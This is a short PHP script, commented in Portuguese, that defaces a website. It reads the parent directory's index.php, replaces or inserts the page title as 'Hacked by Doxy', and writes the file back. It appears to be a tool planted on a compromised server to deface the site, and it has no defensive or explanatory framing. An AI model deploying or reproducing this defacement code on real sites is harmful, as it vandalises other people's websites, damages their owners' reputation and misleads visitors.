<?php
// Caminho do index.php
$indexPath = __DIR__ . "/../index.php";

// Lê o conteúdo atual do index.php
if (!file_exists($indexPath)) {
    die("index.php não encontrado!");
}

$conteudo = file_get_contents($indexPath);

// Novo título da página
$novoTitulo = "Hacked by Doxy";

// Substitui a tag <title> se existir
if (preg_match("/<title>.*?<\/title>/i", $conteudo)) {
    $conteudo = preg_replace("/<title>.*?<\/title>/i", "<title>$novoTitulo</title>", $conteudo);
} else {
    // Insere dentro de <head> se houver
    if (preg_match("/<head.*?>/i", $conteudo)) {
        $conteudo = preg_replace("/<head.*?>/i", "$0<title>$novoTitulo</title>", $conteudo, 1);
    } else {
        // Adiciona <head> se não houver
        $conteudo = "<head><title>$novoTitulo</title></head>" . $conteudo;
    }
}

// Salva o arquivo
if (is_writable($indexPath)) {
    file_put_contents($indexPath, $conteudo);
    echo "Título do index.php alterado para '$novoTitulo'";
} else {
    echo "Sem permissão para escrever em $indexPath";
}
?>
